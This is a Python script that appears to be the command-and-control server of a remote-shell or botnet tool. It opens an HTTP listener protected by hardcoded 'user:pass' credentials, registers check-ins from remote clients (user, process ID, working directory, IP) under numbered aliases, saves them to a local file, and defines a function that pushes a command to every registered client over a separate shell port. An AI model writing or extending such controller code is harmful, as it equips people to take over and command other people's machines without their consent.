from cprint import cprint

import socketserver
from threading import Thread
from legend import server_legacy

import socket, base64
from http.server import BaseHTTPRequestHandler
from urllib.parse import unquote

global req_head, flag
flag = False


class Server(BaseHTTPRequestHandler):
    # def __init__(self, user='', pid='', pwd=''):
        # super(Server, self).__init__()


    def do_POST(self):
        creds = 'user:pass'.encode()
        if self.headers.get('Authorization') == f'Basic {str(base64.b64encode(creds))[2:-1]}':
            global req_head, flag
            req_head = str(self.rfile.read( int(self.headers.get('content-length')) ))[2:-1]
            req_head = req_head.split('&')
            keys, vals = [], []

            for el in req_head:
                key = unquote(el.split('=')[0])
                val = unquote(el.split('=')[1])
                keys.append(key)
                vals.append(val)

            req_head = dict(zip(keys, vals))
            del keys
            del vals

            flag = True
            self.send_response(200)
            self.end_headers()

    def log_message(self, format, *args):
        return

def send_all(clients, command):
    keys = list(clients.keys())
    for el in keys:
        c = clients[el]
        c.initiate()
        c.send(command)
        c.close()



host = socket.getaddrinfo(socket.gethostname(), None)
ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
print(ipv4_addresses[0])
server_address = (ipv4_addresses[0], 8000)
shell_address = ('', 8081)

clients = {}
alias = 0
httpd = socketserver.TCPServer(server_address, Server)
server = Thread(target=httpd.serve_forever, args=())
server.start()

while True:
    if flag:
        user = req_head.get('user')
        pid = req_head.get('pid')
        pwd = req_head.get('pwd')
        client_ip = req_head.get('ip')

        cprint.warn(f'Connected from {client_ip} with alias {alias}')
        c = {"user_cle": user, "pid_cle": pid, "pwd_cle": pwd, "clientip_cle": client_ip, "server_address": shell_address, "alias_cle": str(alias)}
        clients[str(alias)] = c
        alias += 1
        with open("temp.db", "w") as f:
            f.write(str(alias - 1) + "|" + str(c))
            f.close()
        flag = False
